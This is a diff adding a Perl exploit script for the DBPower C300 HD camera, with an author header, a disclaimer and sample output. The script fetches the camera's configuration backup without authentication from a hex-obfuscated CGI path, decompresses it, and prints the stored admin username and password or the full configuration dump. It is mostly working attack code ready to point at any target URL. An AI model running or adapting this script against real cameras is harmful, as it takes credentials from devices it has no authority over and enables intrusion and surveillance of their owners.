@@ -1,0 +1,89 @@
+# Exploit Title: DBPower C300 HD Camera - Remote Configuration Disclosure
+# Date: 2020-02-19
+# Author: Todor Donev
+# Vendor: https://donev.eu/
+# CVE: N/A
+#  Copyright 2020 (c) Todor Donev
+#
+#  https://donev.eu/
+#  https://donev.eu/blog/dbpower-c300-multiple-vulnerabilities
+#
+#  Disclaimer:
+#  This or previous programs are for Educational purpose ONLY. Do not use it without permission. 
+#  The usual disclaimer applies, especially the fact that Todor Donev is not liable for any damages 
+#  caused by direct or indirect use of the  information or functionality provided by these programs. 
+#  The author or any Internet provider  bears NO responsibility for content or misuse of these programs 
+#  or any derivatives thereof. By using these programs you accept the fact  that any damage (dataloss, 
+#  system crash, system compromise, etc.) caused by the use  of these programs are not Todor Donev's 
+#  responsibility.
+#   
+#  Use them at your own risk!  
+#  
+#  (Dont do anything without permissions)
+#
+#
+#	[ DBPower C300 HD Camera Remote Configuration Disclosure
+#	[ ==========================================================
+#	[ Exploit Author: Todor Donev 2020 <todor.donev@gmail.com>
+#	[ Initializing the browser
+#	[ >>  User-Agent => Seamonkey-1.1.13-1(X11; U; GNU Fedora fc 10) Gecko/20081112
+#	[ >>  Content-Type => application/x-www-form-urlencoded
+#	[ <<  Connection => close
+#	[ <<  Date => 
+#	[ <<  Accept-Ranges => bytes
+#	[ <<  Server => thttpd/2.25b 29dec2003
+#	[ <<  Content-Length => 25730
+#	[ <<  Content-Type => application/octet-stream
+#	[ <<  Last-Modified => 
+#	[ <<  Client-Date => 
+#	[ <<  Client-Peer => 192.168.1.103:8080
+#	[ <<  Client-Response-Num => 1
+#	[ 
+#	[ Username : admin
+#	[ Password : admin
+#
+#!/usr/bin/perl
+ 
+use strict;
+use HTTP::Request;
+use LWP::UserAgent;
+use WWW::UserAgent::Random;
+use Gzip::Faster 'gunzip';
+
+my $host = shift || ''; # Full path url to the store
+my $cmd = shift || ''; # show - Show configuration dump
+$host =~ s/\/$//;
+print  "\033[2J";    #clear the screen
+print  "\033[0;0H"; #jump to 0,0
+print "[ DBPower C300 HD Camera Remote Configuration Disclosure\n";
+print "[ ==========================================================\n";
+print "[ Exploit Author: Todor Donev 2020 <todor.donev\@gmail.com>\n";
+if ($host !~ m/^http/){ 
+        print "[ Usage, Password Disclosure: perl $0 https://target:port/\n";
+        print "[ Usage, Show Configuration : perl $0 https://target:port/ show\n";
+        exit;
+}
+print "[ Initializing the browser\n";
+my $user_agent = rand_ua("browsers");
+my $browser  = LWP::UserAgent->new(protocols_allowed => ['http', 'https'],ssl_opts => { verify_hostname => 0 });
+   $browser->timeout(30);
+   $browser->agent($user_agent);
+# my $target = $host."/tmpfs/config_backup.bin";
+my $target = $host."\x2f\x77\x65\x62\x2f\x63\x67\x69\x2d\x62\x69\x6e\x2f\x68\x69\x33\x35\x31\x30\x2f\x62\x61\x63\x6b\x75\x70\x2e\x63\x67\x69";
+my $request = HTTP::Request->new (GET => $target,[Content_Type => "application/x-www-form-urlencoded"]);                      
+my $response = $browser->request($request) or die "[ Exploit Failed: $!";
+print "[ >>  $_ => ", $request->header($_), "\n" for  $request->header_field_names;
+print "[ <<  $_ => ", $response->header($_), "\n" for  $response->header_field_names;
+print "[ Exploit failed! Not vulnerable.\n" and exit if ($response->code ne 200);
+my $gzipped = $response->content();
+my $config = gunzip($gzipped);
+print "[ \n";
+if ($cmd =~ /show/) {
+        print "[ >> Configuration dump...\n[\n";
+        print  "[ ", $_, "\n" for split(/\n/,$config);
+        exit;
+} else {
+        print  "[ Username : ", $1, "\n" if ($config =~ /username=(.*)/);
+        print  "[ Password : ", $1, "\n" if ($config =~ /password=(.*)/);
+        exit;
+}
